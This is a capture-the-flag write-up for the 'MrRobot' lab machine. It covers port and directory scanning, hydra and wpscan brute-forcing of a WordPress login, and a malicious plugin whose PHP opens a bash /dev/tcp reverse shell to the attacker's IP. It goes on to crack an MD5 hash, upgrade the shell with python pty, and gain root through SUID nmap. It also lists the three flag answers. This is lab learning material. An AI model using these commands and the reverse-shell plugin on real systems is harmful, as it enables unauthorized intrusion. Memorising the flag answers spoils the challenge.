# MrRobot CTF

## 1 - What is key 1?

Issue a nmap

```
nmap -sC -sV $IP -oN nmap/initial

22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

Has a server, issue a gobuster with medium wordlist and visit to check

```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster/medium

/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200) <- gives XML parsing error
/rss (Status: 301)
/login (Status: 302)
/video (Status: 301)
/feed (Status: 301)
/0 (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301) (WORDPRESS blog)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
```
The admin directory keeps manipulating the page through javascript, i'll issue another gobuster in the admin

```
nothing more than the previous
```


After being stuck, checked the hint, suggesting robots.txt

I dont know why neither nmap, neither gobuster found the robots.txt file

The /robots.txt has two files

```
fsocity.dic
key-1-of-3.txt
```

### Answer: 073403c8a58a1f80d943455fb30724b9

## 2 - What is key 2?

The fsocity.dic seems like a brute forcing worlist for paths because it includes var, styles, http

used it with gobuster to verify, nothing interesting found.

i knew it was a wordlist but didnt knew for what so i went to check a writeup for this step and the user name was Elliot and the password was test (?!?) but the wordlist can be used to bruteforce both fields.

I researched for a way to do this and was about to do a nmap minning but i noticed something interesting.

When the username provided did not exists, it displays invalid username.
But if the username is correct, it displays wrong password... but since i knew the username from the write-up, i'll assume that i dont know it which lead to never discovering this caviat.

With this i decided to use WPScan sourcing the dict to both flags (passwords and usernames)


```
wpscan --url http://10.10.142.228 -o wpscan/brute -U fsocity.dic -P fsocity.dic
```

Thus this scan is so slow that i went ahead and tried what is done in the write-up, and gave hydra a try.

First step: understand the request (use burp and check the post request)
```
Request: log:username&pwd:passwordwp-submit:Log+In
```

The username and passowrd need to be substituted by the values in the dictionary, to reference them to hydra ^USER^ and ^PASS^ need to substitute username and password in the command


Now hydra needs to know what happens when a wrong username is sourced
```
Response:Invalid username
Hydra: F:=Invalid username
```


All together:
```
"/wp-login/:log=^USER^&pwd=^PASS^wp-submit:Log+In:F=Invalid username"
```

Lets brute force the user
```
Hydra command: hydra -L dic_sorted.txt  -p test $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=Invalid username"

FOUND (did not let run till the end):
Time elapsed: 00:17h
elliot
Elliot
ELLIOT
```

Now lets brute force the password for the user ELLIOT (just user with a different letter casing from the write up and a different error message)

```
Hydra cmd: hydra -l ELLIOT  -P dic_sorted.txt $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=ERROR"

Did not found any match to the dictionary, lets try with the error message and not the tag (ERROR)

```
Since hydra was making a low number of tries per minute (66) i went ahead and performed a wpscan (now the scope is much smaller)

```
WPSCAN command: wpscan --url http://$IP -o wpscan/brute -U ELLIOT -P dic_sorted.txt -v  

FOUND: 

Username: ELLIOT, Password: ER28-0652
```

Went ahead and logged in into the account
There is another user with the following comment in its biography
```
Info: another key?
```


will generate a new password to it:

```
user: mich05654
password: newpassword
```

Nothing interesting in that account.
But we can upload files to the media.
.php are not permited, so tried .php.png and it passed the verification.

From the file details get the link, listen on the port and access the file:

```
nc -lvp 9999
http://10.10.197.116/wp-content/uploads/2020/09/rev.php_.png
```

but the shell did not executed...
lets try it as a plugin but need to provide the arguments as commentaries... the plugin (found this on the web)

```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.128.84/9999 0>&1'");
?>
```
Now we need to zip it and upload through the UI

```
zip rev.zip rev.php
```

After the upload just listen on port and click activate...
We have a shelll, yeahhhh

try to find the keys
```
find / -type f -iname "key-*.txt" -print 2>/dev/null

RESULT:
/opt/bitnami/apps/wordpress/htdocs/key-1-of-3.txt (already submited)
/home/robot/key-2-of-3.txt 
```

lets check that second entry:
```
cat /home/robot/key-2-of-3.txt 

Permission denied.... fuck
```

lets check that folder
```
cd /home/robot
ls -la

-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

There is a password.... (potentially), lets try to crack it since md5 is pretty weak

```
robot:c3fcd3d76192e4007dfb496cca67e13b

Result: abcdefghijklmnopqrstuvwxyz
```

When trying to switch to that user, an error is thrown

```
su: must be run from a terminal
```

Time to learn how to upgrade this simple shell (with python)

```
python -c 'import pty; pty.spawn("/bin/bash")'

su robot
password: abcdefghijklmnopqrstuvwxyz

whoami  (SUCCESS)
robot

cat /home/key-2-of-3.txt
822c73956184f694993bede3eb39f959
```
### Answer: 822c73956184f694993bede3eb39f959

## 3 - What is key 3?

Now, we need to privesc maybe, lets update linpeas to the machine

From the linpeas output one SUID file stands out

```
nmap
```

Checking the gtfobins 

```
nmap --interactive
nmap> !sh

whoami 

root
cd /root

ls -la

-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt

cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

### Answer: 04787ddef27c3dee1ee161b21670b4e4

